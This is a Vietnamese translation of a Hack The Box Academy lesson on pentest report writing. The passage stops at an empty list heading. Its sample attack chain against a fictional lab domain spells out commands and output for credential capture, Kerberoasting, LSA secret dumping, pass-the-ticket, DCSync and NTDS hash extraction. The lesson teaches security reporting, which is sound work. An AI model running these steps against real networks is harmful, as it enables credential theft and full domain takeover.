# Các Thành Phần Của Một Báo Cáo (Components of a Report) — Hack The Box Academy

Như đã đề cập trước đó, báo cáo là sản phẩm bàn giao chính mà khách hàng chi trả khi thuê công ty của bạn thực hiện kiểm thử xâm nhập. Báo cáo là cơ hội để thể hiện công sức bỏ ra trong quá trình đánh giá và mang lại giá trị lớn nhất có thể cho khách hàng. Lý tưởng nhất, báo cáo nên tránh những dữ liệu và thông tin thừa thãi làm "rối" báo cáo hoặc gây xao nhãng khỏi các vấn đề chính mà ta muốn truyền tải về bức tranh tổng thể tình hình an ninh của họ. Mọi thứ trong báo cáo đều cần có lý do tồn tại, và ta không nên làm người đọc quá tải (ví dụ: đừng dán vào 50+ trang console output!). Trong phần này, ta sẽ đi qua các thành phần chính của một báo cáo và cách cấu trúc tốt nhất để thể hiện công sức làm việc, đồng thời giúp khách hàng ưu tiên việc khắc phục.

## Ưu Tiên Công Sức Của Chúng Ta

Trong quá trình đánh giá, đặc biệt là các đánh giá lớn, ta sẽ phải đối mặt với rất nhiều "nhiễu" cần lọc bỏ để tập trung tốt nhất và ưu tiên các phát hiện. Là tester, ta có trách nhiệm công bố mọi thứ tìm được, nhưng khi có quá nhiều thông tin đến từ các bản quét và enumeration, rất dễ bị lạc hướng hoặc tập trung sai chỗ, lãng phí thời gian và có thể bỏ lỡ những vấn đề có tác động lớn. Vì vậy, việc hiểu rõ kết quả đầu ra từ các công cụ, có quy trình lặp lại được (như script hoặc công cụ khác) để lọc qua toàn bộ dữ liệu, xử lý và loại bỏ các false positive hay các vấn đề chỉ mang tính thông tin (informational) — những thứ có thể làm xao nhãng mục tiêu của đánh giá — là điều cực kỳ quan trọng. Kinh nghiệm và một quy trình lặp lại được là chìa khóa để lọc qua toàn bộ dữ liệu và tập trung công sức vào các phát hiện có tác động lớn như lỗi thực thi mã từ xa (RCE) hoặc các lỗi có thể dẫn đến lộ dữ liệu nhạy cảm. Việc báo cáo các phát hiện chỉ mang tính thông tin vẫn đáng làm (và là trách nhiệm của ta), nhưng thay vì dành phần lớn thời gian xác thực những vấn đề nhỏ, không thể khai thác này, bạn có thể cân nhắc gộp một số phát hiện lại thành từng nhóm để cho khách hàng thấy rằng bạn đã biết các vấn đề này tồn tại, nhưng không thể khai thác chúng theo cách có ý nghĩa (ví dụ: 35 biến thể khác nhau của vấn đề SSL/TLS, hàng loạt lỗ hổng DoS trong một phiên bản PHP đã hết hạn hỗ trợ, v.v.).

Khi mới bắt đầu làm pentest, có thể khó xác định nên ưu tiên điều gì, và ta có thể sa vào "hố thỏ" khi cố khai thác một lỗi không tồn tại hoặc cố làm cho một PoC exploit bị lỗi hoạt động được. Thời gian và kinh nghiệm sẽ giúp ích ở đây, nhưng ta cũng nên dựa vào các thành viên cấp cao và người hướng dẫn (mentor) để được giúp đỡ. Điều mà bạn có thể mất nửa ngày để tìm hiểu, họ có thể đã gặp nhiều lần và cho bạn biết ngay liệu đó có phải false positive hay đáng để theo đuổi. Ngay cả khi họ không thể đưa ra câu trả lời rõ ràng ngay lập tức, ít nhất họ cũng có thể chỉ hướng giúp bạn tiết kiệm vài giờ. Hãy vây quanh mình bằng những người mà bạn thoải mái khi nhờ giúp đỡ, những người không khiến bạn cảm thấy ngớ ngẩn nếu bạn không biết hết mọi câu trả lời.

## Viết Attack Chain (Chuỗi Tấn Công)

Attack chain là cơ hội để thể hiện chuỗi khai thác thú vị mà ta đã thực hiện để có được foothold, di chuyển ngang và xâm nhập domain. Đây có thể là công cụ hữu ích giúp người đọc kết nối các dấu chấm khi nhiều phát hiện được sử dụng phối hợp với nhau, và hiểu rõ hơn tại sao một số phát hiện lại được gán mức độ nghiêm trọng như vậy. Ví dụ, một phát hiện riêng lẻ có thể chỉ ở mức rủi ro trung bình, nhưng khi kết hợp với một hoặc hai vấn đề khác, có thể nâng lên mức rủi ro cao — và phần này là cơ hội để minh họa điều đó. Một ví dụ phổ biến là sử dụng Responder để chặn traffic NBT-NS/LLMNR và relay nó đến các host không bật SMB signing. Nó sẽ càng thú vị hơn nếu có thể kết hợp một số phát hiện tưởng chừng không quan trọng, như dùng một lỗi lộ thông tin nào đó để dẫn dắt qua một lỗi LFI nhằm đọc một file cấu hình đáng chú ý, đăng nhập vào một ứng dụng hướng ra ngoài, và tận dụng chức năng đó để đạt được thực thi mã từ xa và có được foothold bên trong mạng nội bộ.

Có nhiều cách để trình bày phần này, phong cách của bạn có thể khác nhau, nhưng hãy cùng đi qua một ví dụ. Ta sẽ bắt đầu bằng một bản tóm tắt attack chain, sau đó đi qua từng bước kèm theo output lệnh và ảnh chụp màn hình hỗ trợ để trình bày attack chain rõ ràng nhất có thể. Một điểm cộng ở đây là ta có thể tái sử dụng phần này làm bằng chứng cho từng phát hiện riêng lẻ, nên không cần định dạng hai lần mà chỉ cần copy/paste vào phát hiện liên quan.

Bắt đầu nào. Ở đây ta giả định rằng mình được thuê để thực hiện Internal Penetration Test đối với công ty Inlanefreight, hoặc bằng một VM trong hạ tầng của khách hàng, hoặc bằng laptop cắm vào cổng ethernet tại văn phòng của họ. Trong ví dụ này, bài đánh giá mô phỏng được thực hiện theo hướng không né tránh (non-evasive) với cách tiếp cận grey box, nghĩa là khách hàng không chủ động can thiệp vào quá trình kiểm thử và chỉ cung cấp dải mạng nằm trong phạm vi, không có thêm thông tin nào khác. Ta đã có thể xâm nhập domain nội bộ INLANEFREIGHT.LOCAL trong quá trình đánh giá.

*Lưu ý: Một bản sao của attack chain này cũng có trong tài liệu báo cáo mẫu đính kèm.*

### Attack Chain Mẫu - INLANEFREIGHT.LOCAL

**Internal Penetration Test**

Trong bài Internal Penetration Test thực hiện đối với Inlanefreight, tester đã có được foothold trong mạng nội bộ, di chuyển ngang, và cuối cùng xâm nhập được domain Active Directory INLANEFREIGHT.LOCAL. Phần trình bày dưới đây minh họa các bước đi từ một người dùng ẩn danh chưa xác thực trong mạng nội bộ đến quyền truy cập cấp Domain Admin. Mục đích của attack chain này là để cho Inlanefreight thấy tác động của từng lỗ hổng được trình bày trong báo cáo và cách chúng kết hợp với nhau để thể hiện rủi ro tổng thể đối với môi trường của khách hàng, đồng thời giúp ưu tiên công tác khắc phục (ví dụ: vá nhanh hai lỗi có thể phá vỡ attack chain trong khi công ty khắc phục toàn bộ các vấn đề đã báo cáo). Dù các phát hiện khác trong báo cáo cũng có thể được tận dụng để đạt mức truy cập tương tự, attack chain này thể hiện con đường ít trở ngại nhất mà tester đã đi để đạt được việc xâm nhập domain.

1. Tester sử dụng công cụ Responder để lấy được password hash NTLMv2 của một người dùng domain, `bsmith`.
2. Hash mật khẩu này được crack offline thành công bằng công cụ Hashcat, tiết lộ mật khẩu dạng cleartext của người dùng, giúp có được foothold vào domain INLANEFREIGHT.LOCAL, nhưng không có quyền cao hơn một người dùng domain thông thường.
3. Tester sau đó chạy công cụ BloodHound.py, phiên bản Python của công cụ thu thập dữ liệu SharpHound phổ biến, để liệt kê domain và tạo biểu đồ trực quan các đường tấn công (attack path). Sau khi xem xét, tester phát hiện có nhiều tài khoản đặc quyền trong domain được cấu hình với Service Principal Name (SPN), có thể bị lợi dụng để thực hiện tấn công Kerberoasting và lấy vé TGS Kerberos cho các tài khoản đó, có thể crack offline bằng Hashcat nếu mật khẩu yếu. Từ đó, tester sử dụng công cụ GetUserSPNs.py để thực hiện tấn công Kerberoasting nhắm mục tiêu vào tài khoản `mssqlsvc`, sau khi phát hiện tài khoản `mssqlsvc` có quyền local administrator trên host SQL01.INLANEFREIGHT.LOCAL — một mục tiêu đáng chú ý trong domain.
4. Tester crack thành công mật khẩu của tài khoản này offline, tiết lộ giá trị cleartext.
5. Tester xác thực vào host SQL01.INLANEFREIGHT.LOCAL và lấy được mật khẩu cleartext từ registry của host bằng cách giải mã LSA secrets cho một tài khoản (`srvadmin`) được cấu hình autologon.
6. Tài khoản `srvadmin` này có quyền local administrator trên tất cả các server (trừ Domain Controller) trong domain, nên tester đăng nhập vào host MS01.INLANEFREIGHT.LOCAL và lấy được vé TGT Kerberos của một người dùng đang đăng nhập, `pramirez`. Người dùng này thuộc nhóm Tier I Server Admins, nhóm này cấp cho tài khoản quyền DCSync đối với đối tượng domain. Cuộc tấn công này có thể được dùng để lấy password hash NTLM của bất kỳ người dùng nào trong domain, dẫn đến việc xâm nhập domain và duy trì truy cập (persistence) qua Golden Ticket.
7. Tester sử dụng công cụ Rubeus để trích xuất vé TGT Kerberos của người dùng `pramirez` và thực hiện tấn công Pass-the-Ticket để xác thực với vai trò người dùng này.
8. Cuối cùng, tester thực hiện tấn công DCSync sau khi xác thực thành công bằng tài khoản này thông qua công cụ Mimikatz, dẫn đến việc xâm nhập domain hoàn toàn.

**Các bước tái hiện chi tiết cho attack chain này như sau:**

Sau khi kết nối vào mạng, tester khởi động công cụ Responder và có thể lấy được hash mật khẩu của người dùng `bsmith` bằng cách giả mạo (spoof) traffic NBT-NS/LLMNR trên phân đoạn mạng cục bộ.

**Responder**
```
naruto3co@htb[/htb]$ sudo responder -I eth0 -wrfv

NBT-NS, LLMNR & MDNS Responder 3.0.6.0

<SNIP>

[+] Generic Options:
    Responder NIC       [eth0]
    Responder IP        [192.168.195.168]
    Challenge set       [random]
    Don't Respond To Names ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name  [WIN-TWWXTGD94CV]
    Responder Domain Name   [3BKZ.LOCAL]
    Responder DCE-RPC Port  [47032]

[+] Listening for events...

<SNIP>

[SMB] NTLMv2-SSP Client   : 192.168.195.205
[SMB] NTLMv2-SSP Username : INLANEFREIGHT\bsmith
[SMB] NTLMv2-SSP Hash     :
bsmith::INLANEFREIGHT:7ecXXXXXX98ebc:73D1B2XXXXXXXXXXX45085A651:0101000000
<SNIP>
```

Tester đã crack thành công hash mật khẩu này offline bằng công cụ Hashcat và lấy được giá trị mật khẩu cleartext, từ đó có được foothold để liệt kê domain Active Directory.

**Hashcat**
```
naruto3co@htb[/htb]$ hashcat -m 5600 bsmith_hash /usr/share/wordlists/rockyou.txt

hashcat (v6.1.1) starting...

<SNIP>

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

BSMITH::INLANEFREIGHT:7eccd965c4b98ebc:73d1b2c8c5f9861eefd31bb45085a651:01
<REDACTED>
```

Tester tiếp tục liệt kê các tài khoản người dùng được cấu hình với Service Principal Name (SPN) có thể bị tấn công Kerberoasting. Kỹ thuật di chuyển ngang/leo thang đặc quyền này nhắm vào các SPN (định danh duy nhất mà Kerberos dùng để ánh xạ một instance dịch vụ với một tài khoản dịch vụ). Bất kỳ người dùng domain nào cũng có thể yêu cầu vé Kerberos cho bất kỳ tài khoản dịch vụ nào trong domain, và vé đó được mã hóa bằng password hash NTLM của tài khoản dịch vụ — có thể "crack" offline để lộ ra giá trị mật khẩu cleartext của tài khoản.

**GetUserSPNs**
```
naruto3co@htb[/htb]$ GetUserSPNs.py INLANEFREIGHT.LOCAL/bsmith -dc-ip 192.168.195.204

Impacket v0.9.24.dev1+20210922.102044.c7bc76f8 - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName                          Name       MemberOf  PasswordLastSet             LastLogon  Delegation
---------------------------------------------  ---------  --------  --------------------------  ---------  ----------
MSSQLSvc/SQL01.inlanefreight.local:1433         mssqlsvc             2022-05-13 16:52:07.280623  <never>
MSSQLSvc/SQL02.inlanefreight.local:1433         sqlprod              2022-05-13 16:54:52.889815  <never>
MSSQLSvc/SQL-DEV01.inlanefreight.local:1433     sqldev               2022-05-13 16:54:57.905315  <never>
MSSQLSvc/QA001.inlanefreight.local:1433         sqlqa                2022-05-13 16:55:03.421004  <never>
backupjob/veam001.inlanefreight.local           backupjob            2022-05-13 18:38:17.740269  <never>
vmware/vc.inlanefreight.local                   vmwaresvc            2022-05-13 18:39:10.691799  <never>
```

Tester sau đó chạy phiên bản Python của công cụ liệt kê Active Directory BloodHound phổ biến để thu thập thông tin như người dùng, nhóm, máy tính, ACL, thành viên nhóm, thuộc tính người dùng/máy tính, phiên đăng nhập, quyền admin cục bộ, v.v. Dữ liệu này sau đó có thể được nhập vào một công cụ giao diện đồ họa để tạo biểu đồ trực quan các mối quan hệ trong domain và vạch ra các "attack path" có thể dùng để di chuyển ngang hoặc leo thang đặc quyền trong domain.

**Bloodhound**
```
naruto3co@htb[/htb]$ sudo bloodhound-python -u 'bsmith' -p '<REDACTED>' -d inlanefreight.local -ns 192.168.195.204 -c All

INFO: Found AD domain: inlanefreight.local
INFO: Connecting to LDAP server: DC01.INLANEFREIGHT.LOCAL
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 503 computers
INFO: Connecting to LDAP server: DC01.INLANEFREIGHT.LOCAL
INFO: Found 652 users

<SNIP>
```

Tester sử dụng công cụ này để kiểm tra quyền hạn của từng tài khoản SPN đã liệt kê ở các bước trước và nhận thấy chỉ có tài khoản `mssqlsvc` có quyền hạn cao hơn một người dùng domain thông thường. Tài khoản này có quyền local administrator trên host `SQL01`. Các SQL server thường là mục tiêu giá trị cao trong domain vì chúng chứa thông tin đăng nhập đặc quyền, dữ liệu nhạy cảm, hoặc thậm chí có thể có một người dùng đặc quyền cao hơn đang đăng nhập.

<img width="1105" height="273" alt="image" src="https://github.com/user-attachments/assets/dba75290-55e4-4d68-b82e-dc4ccefa7bb5" />


Tester sau đó thực hiện tấn công Kerberoasting nhắm mục tiêu để lấy vé TGS Kerberos cho tài khoản dịch vụ `mssqlsvc`.

**GetUserSPNs**
```
naruto3co@htb[/htb]$ GetUserSPNs.py INLANEFREIGHT.LOCAL/bsmith -dc-ip 192.168.195.204 -request-user mssqlsvc

Impacket v0.9.24.dev1+20210922.102044.c7bc76f8 - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName                     Name      MemberOf  PasswordLastSet             LastLogon  Delegation
----------------------------------------  --------  --------  --------------------------  ---------  ----------
MSSQLSvc/SQL01.inlanefreight.local:1433   mssqlsvc            2022-05-13 16:52:07.280623   <never>

$krb5tgs$23$*mssqlsvc$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/mssqlsvc*$2c
<SNIP>
```

Tester đã crack thành công mật khẩu này offline để tiết lộ giá trị cleartext.

**Hashcat**
```
naruto3co@htb[/htb]$ $hashcat -m 13100 mssqlsvc_tgs /usr/share/wordlists/rockyou.txt

hashcat (v6.1.1) starting...

<SNIP>

$krb5tgs$23$*mssqlsvc$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/mssqlsvc*$2c
<REDACTED>
```

Mật khẩu này có thể được dùng để truy cập từ xa vào host `SQL01` và lấy được bộ thông tin đăng nhập cleartext từ registry cho tài khoản `srvadmin`.

**CrackMapExec**
```
naruto3co@htb[/htb]$ crackmapexec smb 192.168.195.220 -u mssqlsvc -p <REDACTED> --lsa

SMB   192.168.195.220 445  SQL01  [*] Windows 10.0 Build 17763 (name:SQL01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
SMB   192.168.195.220 445  SQL01  [+] INLANEFREIGHT.LOCAL\mssqlsvc:<REDACTED>
SMB   192.168.195.220 445  SQL01  [+] Dumping LSA secrets
SMB   192.168.195.220 445  SQL01  INLANEFREIGHT.LOCAL/Administrator:$DCC2$10240#Administrator#7bd0f186CCCCC4
SMB   192.168.195.220 445  SQL01  INLANEFREIGHT.LOCAL/srvadmin:$DCC2$10240#srvadmin#ef393703f3fabCCCCCa547ca

<SNIP>

SMB   192.168.195.220 445  SQL01  INLANEFREIGHT\srvadmin:<REDACTED>

<SNIP>

SMB   192.168.195.220 445  SQL01  [+] Dumped 10 LSA secrets to /home/mrb3n/.cme/logs/SQL01_192.168.195.220_2022-05-14_081528.secrets
```

Sử dụng thông tin đăng nhập này, tester đăng nhập vào host `MS01` qua Remote Desktop (RDP) và nhận thấy một người dùng khác, `pramirez`, cũng đang đăng nhập.

**Người dùng đang đăng nhập (Logged In Users)**
```
C:\htb> query user

 USERNAME     SESSIONNAME    ID  STATE   IDLE TIME  LOGON TIME
 pramirez     rdp-tcp#1      2   Active  3          5/14/2022 8:21 AM
>srvadmin     rdp-tcp#2      3   Active  .          5/14/2022 8:24 AM
```

Tester kiểm tra công cụ BloodHound và nhận thấy người dùng này có thể thực hiện tấn công DCSync, một kỹ thuật đánh cắp cơ sở dữ liệu mật khẩu Active Directory bằng cách lợi dụng giao thức mà các domain controller dùng để đồng bộ dữ liệu domain. Tấn công này có thể được dùng để lấy password hash NTLM của bất kỳ người dùng nào trong domain.

<img width="1242" height="403" alt="image" src="https://github.com/user-attachments/assets/d4215d39-6e19-458c-b584-96f4f03eef90" />


Sau khi kết nối, tester sử dụng công cụ Rubeus để xem tất cả các vé Kerberos hiện có trên hệ thống và nhận thấy có các vé của người dùng `pramirez`.

**Rubeus**
```
PS C:\htb> .\Rubeus.exe triage

v2.0.2

Action: Triage Kerberos Tickets (All Users)

[*] Current LUID : 0x256aef

------------------------------------------------------------------------
| LUID     | UserName                        | Service                                             | EndTime               |
------------------------------------------------------------------------
| 0x256aef | srvadmin @ INLANEFREIGHT.LOCAL  | krbtgt/INLANEFREIGHT.LOCAL                          | 5/14/2022 6:24:19 PM  |
| 0x256aef | srvadmin @ INLANEFREIGHT.LOCAL  | LDAP/DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT.LOCAL   | 5/14/2022 6:24:19 PM  |
| 0x1a8b19 | pramirez @ INLANEFREIGHT.LOCAL  | krbtgt/INLANEFREIGHT.LOCAL                          | 5/14/2022 6:21:35 PM  |
| 0x1a8b19 | pramirez @ INLANEFREIGHT.LOCAL  | ProtectedStorage/DC01.INLANEFREIGHT.LOCAL           | 5/14/2022 6:21:35 PM  |
| 0x1a8b19 | pramirez @ INLANEFREIGHT.LOCAL  | cifs/DC01.INLANEFREIGHT.LOCAL                       | 5/14/2022 6:21:35 PM  |
| 0x1a8b19 | pramirez @ INLANEFREIGHT.LOCAL  | cifs/DC01                                           | 5/14/2022 6:21:35 PM  |
| 0x1a8b19 | pramirez @ INLANEFREIGHT.LOCAL  | LDAP/DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT.LOCAL   | 5/14/2022 6:21:35 PM  |
| 0x1a8ade | pramirez @ INLANEFREIGHT.LOCAL  | krbtgt/INLANEFREIGHT.LOCAL                          | 5/14/2022 6:21:35 PM  |
| 0x1a8ade | pramirez @ INLANEFREIGHT.LOCAL  | LDAP/DC01.INLANEFREIGHT.LOCAL/INLANEFREIGHT.LOCAL   | 5/14/2022 6:21:35 PM  |
```

Tester sau đó sử dụng công cụ này để lấy vé TGT Kerberos của người dùng này, có thể dùng để thực hiện tấn công "pass-the-ticket" và sử dụng vé TGT đã đánh cắp để truy cập tài nguyên trong domain.

```
PS C:\htb> .\Rubeus.exe dump /luid:0x1a8b19 /service:krbtgt

v2.0.2

Action: Dump Kerberos Ticket Data (All Users)

[*] Target service : krbtgt
[*] Target LUID    : 0x1a8b19
[*] Current LUID   : 0x256aef

  UserName               : pramirez
  Domain                 : INLANEFREIGHT
  LogonId                : 0x1a8b19
  UserSID                : S-1-5-21-1666128402-2659679066-1433032234-1108
  AuthenticationPackage  : Negotiate
  LogonType              : RemoteInteractive
  LogonTime              : 5/14/2022 8:21:35 AM
  LogonServer            : DC01
  LogonServerDNSDomain   : INLANEFREIGHT.LOCAL
  UserPrincipalName      : pramirez@INLANEFREIGHT.LOCAL

    ServiceName              :  krbtgt/INLANEFREIGHT.LOCAL
    ServiceRealm             :  INLANEFREIGHT.LOCAL
    UserName                 :  pramirez
    UserRealm                :  INLANEFREIGHT.LOCAL
    StartTime                :  5/15/2022 3:51:35 AM
    EndTime                  :  5/15/2022 1:51:35 PM
    RenewTill                :  5/21/2022 8:21:35 AM
    Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
    KeyType                  :  aes256_cts_hmac_sha1
    Base64(key)              :  3g/++VoJZ4ipbExARBCKK960cN+3juTKNHiQ8XpHL/k=
    Base64EncodedTicket      :

    doIFZDCCBWCgAwIBBaEDAgEWooIEVDCCBFBhgg<SNIP>
```

Người dùng thực hiện tấn công pass-the-ticket và xác thực thành công với vai trò người dùng `pramirez`.

```
PS C:\htb> .\Rubeus.exe ptt /ticket:doIFZDCCBWCgAwIBBaEDAgEWo<SNIP>

v2.0.2

[*] Action: Import Ticket
[+] Ticket successfully imported!
```

Việc này được xác nhận bằng lệnh `klist` để xem các vé Kerberos đã cache trong phiên hiện tại.

**Vé Kerberos đã Cache (Cached Kerberos Tickets)**
```
PS C:\htb> klist

Current LogonId is 0:0x256d1d

Cached Tickets: (1)

#0>     Client: pramirez @ INLANEFREIGHT.LOCAL
        Server: krbtgt/INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 5/15/2022 3:51:35 (local)
        End Time:   5/15/2022 13:51:35 (local)
        Renew Time: 5/21/2022 8:21:35 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

Tester sau đó tận dụng quyền truy cập này để thực hiện tấn công DCSync và lấy được password hash NTLM của tài khoản Administrator có sẵn, dẫn đến quyền truy cập cấp Enterprise Admin đối với toàn bộ domain.

**Mimikatz**
```
PS C:\htb> .\mimikatz.exe

mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53

mimikatz # lsadump::dcsync /user:INLANEFREIGHT\administrator

[DC] 'INLANEFREIGHT.LOCAL' will be the domain
[DC] 'DC01.INLANEFREIGHT.LOCAL' will be the DC server
[DC] 'INLANEFREIGHT\administrator' will be the user account
[rpc] Service       : ldap
[rpc] AuthnSvc      : GSS_NEGOTIATE (9)
[DC] ms-DS-ReplicationEpoch is: 1

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 2/12/2022 9:32:55 PM
Object Security ID   : S-1-5-21-1666128402-2659679066-1433032234-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: e4axxxxxxxxxxxxxxxx1c88c2e94cba2
```

Tester xác nhận quyền truy cập này bằng cách xác thực vào một Domain Controller trong domain INLANEFREIGHT.LOCAL.

**CrackMapExec**
```
naruto3co@htb[/htb]$ sudo crackmapexec smb 192.168.195.204 -u administrator -H e4axxxxxxxxxxxxxxxx1c88c2e94cba2

SMB   192.168.195.204 445  DC01  [*] Windows 10.0 Build 17763 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB   192.168.195.204 445  DC01  [+] INLANEFREIGHT.LOCAL\administrator e4axxxxxxxxxxxxxxxx1c88c2e94cba2
```

Với quyền truy cập này, có thể lấy được password hash NTLM của tất cả người dùng trong domain. Tester sau đó thực hiện crack offline các hash này bằng công cụ Hashcat. Phần phân tích mật khẩu domain với nhiều chỉ số thống kê có thể được tìm thấy trong phần phụ lục của báo cáo.

**Trích xuất NTDS bằng SecretsDump**
```
naruto3co@htb[/htb]$ secretsdump.py inlanefreight/administrator@192.168.195.204 -hashes ad3b435b51404eeaad3b435b51404ee:e4axxxxxxxxxxxxxxxx1c88c2e94cba2 -just-dc-ntlm

Impacket v0.9.24.dev1+20210922.102044.c7bc76f8 - Copyright 2021 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets

Administrator:500:aad3b435b51404eeaad3b435b51404ee:e4axxxxxxxxxxxxxxxx1c88
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cxxxxxxxxxx7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4180f1f4xxxxxxxxxx0e8523771a8c
mssqlsvc:1106:aad3b435b51404eeaad3b435b51404ee:55a6c7xxxxxxxxxxxx2b07e1::
srvadmin:1107:aad3b435b51404eeaad3b435b51404ee:9f9154fxxxxxxxxxxxxx0930c0
pramirez:1108:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9xxxxxxxxxxxxxed5
<SNIP>
```

## Viết Một Executive Summary (Tóm Tắt Điều Hành) Hiệu Quả

Executive Summary là một trong những phần quan trọng nhất của báo cáo. Như đã đề cập, khách hàng cuối cùng chi trả cho sản phẩm báo cáo — thứ có nhiều mục đích ngoài việc chỉ ra điểm yếu và các bước tái hiện dành cho đội kỹ thuật khắc phục. Báo cáo có thể sẽ được xem một phần bởi các bên liên quan nội bộ khác như bộ phận Kiểm toán Nội bộ, ban quản lý CNTT và An ninh CNTT, ban lãnh đạo cấp C, và thậm chí là Hội đồng Quản trị. Báo cáo có thể được dùng để xác nhận ngân sách năm trước cho an ninh thông tin hoặc để đề nghị thêm ngân sách cho năm tiếp theo. Vì vậy, ta cần đảm bảo báo cáo có nội dung mà người không có kiến thức kỹ thuật cũng dễ dàng hiểu được.

### Các Khái Niệm Chính

Đối tượng mục tiêu của Executive Summary thường là người sẽ chịu trách nhiệm phân bổ ngân sách để khắc phục các vấn đề ta phát hiện được. Dù muốn hay không, một số khách hàng có thể đã cố gắng xin ngân sách để khắc phục các vấn đề được nêu trong báo cáo trong nhiều năm và hoàn toàn có ý định dùng báo cáo làm "vũ khí" để cuối cùng thực hiện được điều gì đó. Đây là cơ hội tốt nhất để giúp họ. Nếu ta làm mất sự chú ý của người đọc ở đây và có giới hạn về ngân sách, phần còn lại của báo cáo nhanh chóng trở nên vô giá trị. Một số giả định quan trọng (có thể đúng hoặc không) để tối đa hóa hiệu quả của Executive Summary:

- Điều này nên hiển nhiên, nhưng phần này cần được viết cho người hoàn toàn không có kiến thức kỹ thuật. Thước đo thông thường là "nếu bố mẹ bạn không hiểu được vấn đề, thì bạn cần viết lại" (giả sử bố mẹ bạn không phải CISO hay sysadmin gì đó).
- Người đọc không làm việc này hàng ngày. Họ không biết Rubeus làm gì, password spraying nghĩa là gì, hay làm sao mà một vé lại có thể cấp ra vé khác (thậm chí có thể không biết vé (ticket) trong ngữ cảnh này là gì, ngoài việc liên tưởng đến vé vào cổng một buổi hòa nhạc hay trận bóng).
- Đây có thể là lần đầu tiên họ trải qua một cuộc kiểm thử xâm nhập.
- Cũng giống như phần còn lại của thế giới trong thời đại "thỏa mãn tức thì", khả năng tập trung của họ khá ngắn. Khi ta làm mất sự tập trung đó, khả năng cao là không lấy lại được.
- Cùng lý do đó, không ai thích đọc thứ gì mà họ phải Google để hiểu nghĩa. Đó gọi là những thứ gây xao nhãng.

Hãy cùng đi qua danh sách "nên và không nên" khi viết một Executive Summary hiệu quả.

**Nên**

- **Khi nói về các chỉ số, hãy càng cụ thể càng tốt.** Những từ như "several", "multiple", "few" (một vài, nhiều, ít) rất mơ hồ — có thể là 6 hoặc 500. Cấp quản lý sẽ không lục lại báo cáo để tìm thông tin này, vì vậy nếu đề cập đến, hãy cho họ biết con số cụ thể; nếu không, bạn sẽ mất sự chú ý của họ. Lý do phổ biến nhất khiến người viết không dùng con số cụ thể là để tránh trường hợp consultant bỏ sót một trường hợp nào đó. Bạn có thể điều chỉnh ngôn từ một chút để xử lý việc này, ví dụ: "dù có thể còn thêm các trường hợp khác của X, trong thời gian được cấp cho đánh giá, chúng tôi ghi nhận 25 trường hợp X."
- **Đây là một bản tóm tắt. Hãy giữ đúng như vậy.** Nếu bạn viết hơn 1.5-2 trang, có thể bạn đã viết quá dài dòng. Hãy xem lại các chủ đề đã đề cập và xác định xem có thể gộp chúng vào các danh mục cấp cao hơn, thuộc về một chính sách hoặc quy trình cụ thể hay không.
- **Mô tả các loại thứ mà bạn đã truy cập được.** Khán giả của bạn có thể không biết "Domain Admin" nghĩa là gì, nhưng nếu bạn đề cập rằng bạn đã có quyền truy cập vào một tài khoản cho phép bạn nắm được tài liệu nhân sự, hệ thống ngân hàng và các tài sản quan trọng khác — điều đó ai cũng hiểu được.
- **Mô tả những điều chung cần cải thiện để giảm thiểu rủi ro đã phát hiện.** Đây không nên chỉ là "cài 3 bản vá rồi gọi lại tôi sau một năm". Bạn nên nghĩ theo hướng "quy trình nào đã bị lỗi khiến một lỗ hổng 5 năm tuổi vẫn chưa được vá trong 1/4 toàn bộ môi trường?". Nếu bạn thực hiện password spray và có 500 kết quả trùng "Welcome1!", việc đổi mật khẩu của 500 tài khoản đó chỉ là một phần giải pháp. Phần còn lại có thể là cung cấp cho Help Desk một cách để thiết lập mật khẩu ban đầu mạnh hơn một cách hiệu quả.
- **Nếu bạn cảm thấy tự tin và có kinh nghiệm đáng kể ở cả hai phía, hãy đưa ra kỳ vọng chung về mức công sức cần thiết để khắc phục một số vấn đề.** Nếu bạn từng có thời gian dài làm sysadmin hoặc kỹ sư và hiểu được rào cản chính trị nội bộ mà mọi người có thể phải vượt qua để bắt đầu điều chỉnh group policy, bạn có thể muốn đặt kỳ vọng về mức độ thời gian và công sức thấp, vừa, và đáng kể để khắc phục các vấn đề — để một CEO quá nhiệt tình không yêu cầu đội server phải áp dụng CIS hardening template lên GPO ngay trong cuối tuần mà không thử nghiệm trước.

**Không nên**

